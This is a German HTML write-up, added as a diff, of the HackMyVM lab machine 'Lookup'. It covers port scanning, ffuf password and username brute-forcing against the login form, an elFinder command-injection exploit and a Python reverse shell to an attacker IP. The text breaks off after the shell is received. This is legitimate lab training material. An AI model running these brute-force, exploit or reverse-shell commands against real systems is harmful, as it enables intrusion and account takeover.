@@ -1,0 +1,815 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lookup - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Lookup - HackMyVM - Medium - Bericht</h1> <!-- Titel und Level angepasst -->
+        <div class="level-container">
+            <!-- H2 ohne Inline-Style, Farbe wird durch CSS gesteuert (sollte auf Gelb angepasst werden) -->
+            <h2>Medium</h2>
+            <div class="circle">
+                <!-- Segmente ohne Inline-Style, Farbe wird durch CSS gesteuert (sollte auf Gelb angepasst werden) -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Innerer Kreis ohne Inline-Style, Farbe wird durch CSS gesteuert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">ping6</div>
+                <div class="tool-item">ip neigh</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">awk</div>
+                <div class="tool-item">sort</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">vi / nano</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">wapiti</div>
+                <div class="tool-item">ffuf</div>
+                <div class="tool-item">searchsploit</div>
+                <div class="tool-item">python2 (Exploit)</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">file</div>
+                <div class="tool-item">strings</div>
+                <div class="tool-item">mktemp</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">export</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">passwd</div>
+                <div class="tool-item">look</div>
+                <div class="tool-item">ssh2john</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance (IPv4 & IPv6)</a></li>
+                <li><a href="#web-enumeration">Web Enumeration & Vulnerability Scanning</a></li>
+                <li><a href="#credential-access">Credential Access (Brute-Force)</a></li>
+                <li><a href="#subdomain-enumeration">Subdomain Enumeration & elFinder</a></li>
+                <li><a href="#initial-access">Initial Access (elFinder Exploit)</a></li>
+                <li><a href="#privilege-escalation-1">Privilege Escalation (pwm Path Hijacking)</a></li>
+                <li><a href="#lateral-movement">Lateral Movement (SSH as think)</a></li>
+                <li><a href="#privilege-escalation-2">Privilege Escalation (think to root via sudo look)</a></li>
+                <li><a href="#poc">Proof of Concept (POC)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance (IPv4 & IPv6)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Ein benutzerdefiniertes Skript (`recon_script.sh`) wird ausgeführt, das interne Schritte zur Zielidentifikation beinhaltet. Der erste sichtbare Schritt ist ein ARP-Scan.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Kein Prompt - Skriptausführung]</div>
+                     <pre>X=$(./recon_script.sh jenk.nyx)
+echo $X</pre>
+                     <div class="prompt">[Kein Prompt - Ausgabe von arp-scan innerhalb des Skripts]</div>
+                     <pre>192.168.2.164	08:00:27:5a:36:a7	PCS Systemtechnik GmbH</pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Host `192.168.2.164` wird im lokalen Netzwerk gefunden (Oracle VirtualBox).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Ziel-IPv4 bekannt. Prüfen Sie auf IPv6 und führen Sie Portscans durch.
+<br><strong>Empfehlung (Admin):** Standard Netzwerk-Monitoring.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">[Kein Prompt - Skriptausführung: /etc/hosts Bearbeitung]</div>
+                     <pre>[Inhalt /etc/hosts nach Bearbeitung]
+...
+192.168.2.164   lookup.hmv
+...</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Hostname `lookup.hmv` wird der gefundenen IP in `/etc/hosts` zugeordnet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ermöglicht die Verwendung des Hostnamens für weitere Scans und Zugriffe.</p>
+
+             <p class="analysis"><strong>Analyse:</strong> Das Skript führt eine IPv6-Nachbarerkennung durch und startet einen Nmap-Scan gegen gefundene Adressen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">cmd=$(ip neigh | grep ^fe80 2>/dev/null| grep -ve "fe80::1\|fe80::a00:27ff:fe30:2eda\|fe80::8247:86ff:fe96:f63a\|fe80::50f1:22ff:fec4:ad12\|fe80::a5aa:636f:a4bf:d441");\</span> <span class="comment">\</span>
+    <span class="command">cmd2=$(echo $cmd |  awk '{print $1}' | sort -u);\</span> <span class="comment">\</span>
+    <span class="command">nmap $cmd2 -6;</span></div> <!-- Maskierung: > -->
+                    <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-27 22:30 CET
+Nmap scan report for lookup (<span class="command">fe80::a00:27ff:fe5a:36a7</span>) <span class="comment"><-- Ziel IPv6</span>
+Host is up (0.000078s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+<span class="command">22/tcp open  ssh</span>
+<span class="command">80/tcp open  http</span>
+MAC Address: 08:00:27:5A:36:A7 (Oracle VirtualBox virtual NIC)
+
+Nmap scan report for fe80::acef:d4ff:fea6:85d3
+Host is up (0.0064s latency).
+All 65535 scanned ports on fe80::acef:d4ff:fea6:85d3 are in ignored states.
+Not shown: 65535 closed tcp ports (reset)
+MAC Address: AE:EF:D4:A6:85:D3 (Unknown)
+
+Nmap scan report for fe80::d0a5:97c8:ee04:6f55
+Host is up (0.0000060s latency).
+All 65535 scanned ports on fe80::d0a5:97c8:ee04:6f55 are in ignored states.
+Not shown: 65535 closed tcp ports (reset)
+
+Nmap done: 4 IP addresses (3 hosts up) scanned in 33.02 seconds
+</pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Skript identifiziert die Link-Local-IPv6-Adresse (`fe80::a00:27ff:fe5a:36a7`) des Ziels und bestätigt, dass Port 22 (SSH) und 80 (HTTP) auch über IPv6 offen sind.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** IPv6-Erreichbarkeit bestätigt. Fokussieren Sie sich auf die IPv4-Enumeration, behalten Sie IPv6 aber im Hinterkopf.
+<br><strong>Empfehlung (Admin):** IPv6-Konfiguration und Firewall-Regeln überprüfen.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein schneller UDP-Scan der Top 1000 Ports wird durchgeführt.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+ └─# <span class="command">nmap -sU --top-port 1000 -T5 -n $IP -Pn  --min-rate 5000</span></div> <!-- $IP wird zu 192.168.2.164 expandiert -->
+                     <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-27 22:30 CET
+Nmap scan report for 192.168.2.164
+Host is up (0.00032s latency).
+Not shown: 995 open|filtered udp ports (no-response)
+PORT      STATE  SERVICE
+2160/udp  closed apc-2160
+3401/udp  closed squid-snmp
+17585/udp closed unknown
+18255/udp closed unknown
+20146/udp closed unknown
+MAC Address: 08:00:27:5A:36:A7 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.76 seconds
+</pre>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Der UDP-Scan findet keine offenen Ports unter den Top 1000. Die meisten Ports sind `open|filtered`, was bedeutet, dass Nmap keine Antwort erhielt (typisch für UDP, wenn keine Anwendung lauscht oder eine Firewall blockiert).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):** Keine offenen UDP-Dienste in den Top 1000 gefunden. Ein vollständiger UDP-Scan (`-p-`) wäre möglich, ist aber sehr zeitaufwendig und oft wenig ergiebig. Fokus auf TCP.
+<br><strong>Empfehlung (Admin):** Gutes Ergebnis, keine unnötigen UDP-Dienste offen.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein schneller TCP-Scan mit Versionserkennung wird durchgeführt und nach offenen Ports gefiltert.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+ └─# <span class="command">nmap -sS -sC -sV -A -p- $IP -Pn  --min-rate 5000 | grep open</span></div> <!-- $IP=192.168.2.164 -->
+                     <pre>
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Ein vollständiger TCP-Scan mit aggressiver Erkennung wird durchgeführt.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+ └─# <span class="command">nmap -sS -sC -sV -A -p- $IP -Pn  --min-rate 5000</span></div> <!-- $IP=192.168.2.164 -->
+                     <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-27 22:30 CET
+Nmap scan report for lookup.hmv (192.168.2.164)
+Host is up (0.00011s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)</span>
+| ssh-hostkey:
+|   <span class="command">3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)</span>
+|   <span class="command">256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)</span>
+|_  <span class="command">256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)</span>
+<span class="command">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span>
+|_<span class="command">http-server-header: Apache/2.4.41 (Ubuntu)</span>
+|_<span class="command">http-title: Login Page</span>
+MAC Address: 08:00:27:5A:36:A7 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: <span class="command">Linux 4.X|5.X</span>
+OS CPE: <span class="command">cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span>
+OS details: <span class="command">Linux 4.15 - 5.8</span>
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.11 ms lookup.hmv (192.168.2.164)
+
+OS and Service detection performed...
+Nmap done: 1 IP address (1 host up) scanned in 9.66 seconds
+</pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die offenen Ports 22 (OpenSSH 8.2p1 auf Ubuntu) und 80 (Apache 2.4.41 auf Ubuntu). Der Titel der Webseite auf Port 80 lautet "Login Page".</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Fokus auf den Webserver Port 80. Untersuchen Sie die Login-Seite und führen Sie Verzeichnis-Enumeration durch.
+<br><strong>Empfehlung (Admin):** SSH und Apache aktuell halten. Sicherheitsmaßnahmen für die Login-Seite implementieren (Rate Limiting, starke Passwörter).</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration & Vulnerability Scanning</h2>
+            <p class="analysis"><strong>Analyse:</strong> `curl` wird verwendet, um die Header der Webseite auf Port 80 abzurufen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -Iv http://$IP</span></div> <!-- $IP=192.168.2.164 -->
+                     <pre>
+*   Trying 192.168.2.164:80...
+* Connected to 192.168.2.164 (192.168.2.164) port 80
+* using HTTP/1.x
+> HEAD / HTTP/1.1
+> Host: 192.168.2.164
+> User-Agent: curl/8.10.1
+> Accept: */*
+>
+* Request completely sent off
+< <span class="command">HTTP/1.1 302 Found</span>
+< Date: Mon, 27 Jan 2025 21:31:22 GMT
+< Server: Apache/2.4.41 (Ubuntu)
+< <span class="command">Location: http://lookup.hmv</span>
+< Content-Type: text/html; charset=UTF-8
+<
+
+* Connection #0 to host 192.168.2.164 left intact
+</pre> <!-- Maskierung: & -->
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Zugriff auf die IP-Adresse führt zu einer Weiterleitung (`302 Found`) auf den Hostnamen `http://lookup.hmv`. Dies bestätigt die Notwendigkeit des `/etc/hosts`-Eintrags für den Zugriff auf die eigentliche Anwendung.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Führen Sie alle weiteren Web-Scans und Tests gegen `http://lookup.hmv` durch.
+<br><strong>Empfehlung (Admin):** Sicherstellen, dass die Weiterleitung korrekt konfiguriert ist und keine offenen Weiterleitungen (Open Redirects) möglich sind.</p>
+
+             <p class="analysis"><strong>Analyse:</strong> Nikto wird auf die IP-Adresse ausgeführt (sollte aber gegen den Hostnamen laufen).</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">[Kein Prompt - Nikto Scan]</div>
+                     <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.164
++ Target Hostname:    192.168.2.164
++ Target Port:        80
++ Start Time:         2025-01-27 22:31:24 (GMT1)
+---------------------------------------------------------------------------
++ Server: <span class="command">Apache/2.4.41 (Ubuntu)</span>
++ /: <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span> ...
++ /: <span class="password">The X-Content-Type-Options header is not set.</span> ...
++ Root page / <span class="password">redirects to: http://lookup.hmv</span>
++ No CGI Directories found ...
++ <span class="password">Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54).</span> ...
++ 8102 requests: 0 error(s) and 3 item(s) reported on remote host
++ End Time:           2025-01-27 22:32:04 (GMT1) (40 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Nikto bestätigt die Weiterleitung und meldet fehlende Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`) sowie eine veraltete Apache-Version. Keine kritischen Funde.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Führen Sie Nikto erneut gegen `http://lookup.hmv` aus. Konzentrieren Sie sich auf die Login-Seite.
+<br><strong>Empfehlung (Admin):** Sicherheitsheader implementieren, Apache aktualisieren.</p>
+
+             <p class="analysis"><strong>Analyse:</strong> Gobuster wird gegen die IP-Adresse ausgeführt.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+ └─# <span class="command">gobuster dir -u "http://$IP" -w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -x ...[ext]... -b '503,404,403' -e --no-error -k</span></div> <!-- $IP=192.168.2.164 -->
+                     <pre>
+... Gobuster Output ...
+<span class="command">http://192.168.2.164/index.php</span>            (Status: 302) [Size: 0] [--> http://lookup.hmv]
+</pre>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet nur `index.php`, die auf den Hostnamen weiterleitet. Dies bestätigt, dass Scans gegen den Hostnamen (`lookup.hmv`) durchgeführt werden müssen.</p>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Quellcode der Login-Seite (`http://lookup.hmv/`) wird angezeigt.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Kein Prompt - view-source:http://lookup.hmv/]</div>
+                     <pre><code class="language-html"> 
+   Login Page 
+ 
+  <div class="container">
+    form action="login.php" method="post" 
+      <h2>Login</h2>
+         <label for="username">Username:....</label>
+        <label for="password">Password:....</label>  
+    </div>
+ </pre> <!-- Maskierung: <!DOCTYPE >, < > -->
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Standard-HTML-Login-Formular. Sendet `username` und `password` via POST an `login.php`.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, `robots.txt` abzurufen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Kein Prompt - view-source:http://lookup.hmv/robots.txt]</div>
+                     <pre><code class="language-html">
+ 
+ 404 Not Found 
+ 
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<hr>
+<address>Apache/2.4.41 (Ubuntu) Server at lookup.hmv Port 80</address>
+ 
+</code></pre> <!-- Maskierung: <!DOCTYPE >, < > -->
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> `robots.txt` existiert nicht (Status 404).</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein erfolgloser Login-Versuch führt zu einer Fehlermeldung.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Kein Prompt - Webseiten-Antwort nach fehlgeschlagenem Login]</div>
+                     <pre>Wrong password. Please try again.
+Redirecting in 3 seconds.</pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Fehlermeldung "Wrong password" unterscheidet sich möglicherweise von "Wrong username", was auf eine User Enumeration Schwachstelle hindeuten könnte. Sie gibt auch einen Hinweis für Brute-Force-Filter (`-fr "Wrong password."` für `ffuf`).</p>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Web-Schwachstellen-Scanner `wapiti` wird auf die Login-Seite ausgeführt.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">wapiti --url http://lookup.hmv</span></div>
+                     <pre>
+... (Wapiti Banner) ...
+[*] Saving scan state, please wait...
+...
+[*] Wapiti found 3 URLs and forms during the scan
+[*] Loading modules: ...
+[*] Launching module csp
+CSP is not set
+[*] Launching module http_headers
+Checking X-Frame-Options : X-Frame-Options is not set
+Checking X-XSS-Protection : X-XSS-Protection is not set
+Checking X-Content-Type-Options : X-Content-Type-Options is not set
+Checking Strict-Transport-Security : Strict-Transport-Security is not set
+[*] Launching module cookieflags
+... (Andere Module ohne Funde) ...
+[*] Launching module ssrf
+[*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?id=... for results, please wait...
+...
+Report
+------
+A report has been generated in the file /root/.wapiti/generated_report/lookup.hmv_...html
+...
+Summary
+Category                         Number of vulnerabilities found
+---------------------------------------------------------------
+Content Security Policy Configuration   1
+HTTP Secure Headers                     4
+...
+</pre>
+                 </div>
+             </div>
+             <!-- Gekürzter Wapiti Report -->
+            <p class="evaluation"><strong>Bewertung:</strong> `wapiti` findet keine kritischen Schwachstellen wie SQLi oder XSS, bestätigt aber die von `nikto` gefundenen fehlenden Sicherheitsheader (CSP, X-Frame-Options, X-XSS-Protection, X-Content-Type-Options, HSTS).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Da automatisierte Scanner keine kritischen Lücken finden, konzentrieren Sie sich auf Brute-Force-Angriffe auf das Login und manuelle Tests.
+<br><strong>Empfehlung (Admin):** Sicherheitsheader implementieren.</p>
+        </section>
+
+        <section id="credential-access">
+             <h2>Credential Access (Brute-Force)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Ein Brute-Force-Angriff mit `ffuf` wird auf das Passwort für den Benutzer `admin` durchgeführt. `-d` gibt die POST-Daten an, wobei `PASSWRD` durch Einträge aus `rockyou.txt` ersetzt wird. `-H` setzt den Content-Type Header. `-fr "Wrong password."` filtert Antworten heraus, die auf ein falsches Passwort hindeuten.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+ └─# <span class="command">ffuf -u "http://lookup.hmv/login.php" -d "username=admin&password=PASSWRD" -w /usr/share/wordlists/rockyou.txt:PASSWRD -H "Content-Type: application/x-www-form-urlencoded" -fr "Wrong password." -c -ic -t 30</span></div> <!-- Maskierung: & -->
+                     <pre>
+... (ffuf Banner) ...
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://lookup.hmv/login.php
+ :: Wordlist         : PASSWRD: /usr/share/wordlists/rockyou.txt
+ :: Header           : Content-Type: application/x-www-form-urlencoded
+ :: Data             : username=admin&password=PASSWRD
+ ...
+ :: Filter           : Regexp: Wrong password.
+________________________________________________
+
+<span class="password">password123</span>             [Status: 200, Size: 74, Words: 10, Lines: 1, Duration: 0ms] <span class="comment"><-- Erfolg!</span>
+...
+</pre>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Angriff ist erfolgreich! Das Passwort `<span class="password">password123</span>` für den Benutzer `admin` wird gefunden, da die Antwort nicht den gefilterten Text "Wrong password." enthielt.</p>
+            <p class="analysis"><strong>Analyse Fortsetzung:** Nachdem das Passwort `password123` bekannt ist, wird ein Brute-Force-Angriff auf den Benutzernamen durchgeführt, um zu sehen, ob andere Benutzer das gleiche Passwort verwenden. `-fr "Wrong username or password."` filtert Fehlermeldungen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+ └─# <span class="command">ffuf -u "http://lookup.hmv/login.php" -d "username=USERNAME&password=password123" -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt:USERNAME -H "Content-Type: application/x-www-form-urlencoded" -fr "Wrong username or password." -c -ic -t 30</span></div> <!-- Maskierung: & -->
+                     <pre>
+... (ffuf Banner) ...
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://lookup.hmv/login.php
+ :: Wordlist         : USERNAME: /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+ :: Header           : Content-Type: application/x-www-form-urlencoded
+ :: Data             : username=USERNAME&password=password123
+ ...
+ :: Filter           : Regexp: Wrong username or password.
+________________________________________________
+
+<span class="command">jose</span>                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2ms] <span class="comment"><-- Erfolg!</span>
+...
+</pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Angriff findet einen weiteren Benutzer, `jose`, der ebenfalls das Passwort `password123` verwendet. Der Statuscode `302 Found` deutet auf einen erfolgreichen Login und eine Weiterleitung hin.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Versuchen Sie, sich als Benutzer `jose` mit dem Passwort `password123` einzuloggen. Untersuchen Sie die Funktionalität, die nach dem Login verfügbar ist.
+<br><strong>Empfehlung (Admin):** Erzwingen Sie starke, eindeutige Passwörter. Verbieten Sie die Wiederverwendung von Passwörtern und häufige Passwörter wie "password123". Implementieren Sie Anti-Brute-Force-Maßnahmen (Rate Limiting, Lockout, CAPTCHA).</p>
+        </section>
+
+        <section id="subdomain-enumeration">
+            <h2>Subdomain Enumeration & elFinder</h2>
+             <p class="analysis"><strong>Analyse:</strong> Nach dem Login als `jose` (Schritt nicht gezeigt, aber impliziert) oder durch weitere Enumeration wird die Subdomain `files.lookup.hmv` entdeckt. Diese wird zur lokalen `/etc/hosts`-Datei hinzugefügt.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/.wapiti/generated_report]
+└─# <span class="command">vi /etc/hosts</span></div>
+                     <div class="prompt">┌──(root㉿CCat)-[~/.wapiti/generated_report]
+ └─# <span class="command">grep look /etc/hosts</span></div>
+                     <pre>
+                192.168.2.164   lookup.hmv www.lookup.hmv <span class="command">files.lookup.hmv</span>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse Fortsetzung:** Beim Zugriff auf `http://files.lookup.hmv/` wird eine Instanz von `elFinder` (ein Web-Dateimanager) gefunden, die unter `http://files.lookup.hmv/elFinder/elfinder.html` erreichbar ist.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Kein Prompt - Browser Zugriff]</div>
+                     <pre>URL: <span class="command">http://files.lookup.hmv/elFinder/elfinder.html#elf_l1_Lw</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Innerhalb von elFinder wird eine Datei `user.txt` gefunden und deren Inhalt (eine Wortliste) angezeigt oder heruntergeladen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Kein Prompt - Inhalt von user.txt aus elFinder]</div>
+                     <pre>earthy
+fiduciary
+weighted
+outbound
+rycca
+show-offs
+overcast
+packinghouse
+swaddle
+throbbed
+resourcelessness
+jazz
+nopassword
+pectic
+agretha
+only-begotten
+renewable
+symmetrical
+volumetrically
+password123 <span class="comment"><-- Bekanntes Passwort</span>
+altair
+smokestack
+superconductor</pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Entdeckung einer elFinder-Instanz ist signifikant, da ältere Versionen oft Schwachstellen aufweisen. Die `user.txt`-Datei scheint hier eher eine Wortliste als ein Flag zu sein und enthält das bereits bekannte Passwort `password123`.</p>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Mit `searchsploit` wird nach bekannten Exploits für elFinder gesucht.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">searchsploit elFinder</span></div>
+                     <pre>
+------------------------------------------------------------ ---------------------------------
+ Exploit Title                                              |  Path
+------------------------------------------------------------ ---------------------------------
+elFinder 2 - Remote Command Execution (via File Creation)   | php/webapps/36925.py
+<span class="command">elFinder 2.1.47 - 'PHP connector' Command Injection</span>         | <span class="command">php/webapps/46481.py</span> <span class="comment"><-- Relevanter Exploit</span>
+elFinder PHP Connector < 2.1.48 - 'exiftran' Command Inject | php/remote/46539.rb
+elFinder Web file manager Version - 2.1.53 Remote Command E | php/webapps/51864.txt
+------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+</pre> <!-- Maskierung: < -->
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Mehrere Exploits werden gefunden. Der Exploit `46481.py` für Command Injection im PHP Connector von elFinder < 2.1.48 ist ein vielversprechender Kandidat.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Laden Sie den Exploit `46481.py` herunter und führen Sie ihn gegen die elFinder-Instanz aus (`python2 46481.py "http://files.lookup.hmv/elFinder/"`). Dieser Exploit lädt typischerweise eine kleine Webshell hoch und versucht, Befehle auszuführen.
+<br><strong>Empfehlung (Admin):** Aktualisieren Sie elFinder dringend auf die neueste Version. Entfernen oder beschränken Sie den Zugriff auf elFinder, wenn er nicht unbedingt öffentlich zugänglich sein muss.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (elFinder Exploit)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der elFinder-Exploit (`46481.py`) wird ausgeführt. Der Exploit lädt eine Datei hoch (wahrscheinlich ein Bild mit eingebettetem PHP-Code oder eine PHP-Datei, die als Bild getarnt ist) und führt dann eine Command Injection aus, um diesen Code zur Ausführung zu bringen.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">mv maxxx.jpg SecSignal.jpg</span></div> <!-- Unklarer Bezug, evtl. Vorbereitung? -->
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+ └─# <span class="command">python2 46481.py "http://files.lookup.hmv/elFinder/"</span></div>
+                     <pre>
+[*] Uploading the malicious image...
+[*] Running the payload...
+<span class="password">[+] Pwned! :)</span>
+[+] Getting the shell...
+$</pre> <!-- Shell erhalten! -->
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Exploit ist erfolgreich und liefert eine interaktive Shell auf dem Server. Die Shell läuft mit den Rechten des Webserver-Benutzers (`www-data`, wie später bestätigt wird).</p>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Innerhalb der erhaltenen Shell wird die Python-Version überprüft und eine stabilere Reverse Shell mittels Python zu einem Netcat-Listener aufgebaut.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">$ <span class="command">python --version</span></div>
+                     <pre>[Keine Ausgabe, Python 2 nicht gefunden?]</pre>
+                     <div class="prompt">$ <span class="command">python3 --version</span></div>
+                     <pre>Python 3.8.10</pre>
+                    <div class="prompt">$ <span class="command">python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.2.199",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></div>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Der Netcat-Listener empfängt die Verbindung.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~/.wapiti/generated_report]
+ └─# <span class="command">nc -lvnp 5555</span></div>
+                     <pre>
+listening on [any] 5555 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.164] 49030</span>
+/bin/sh: 0: can't access tty; job control turned off
+$</pre> <!-- Shell erhalten -->
+                 </div>
+             </div>
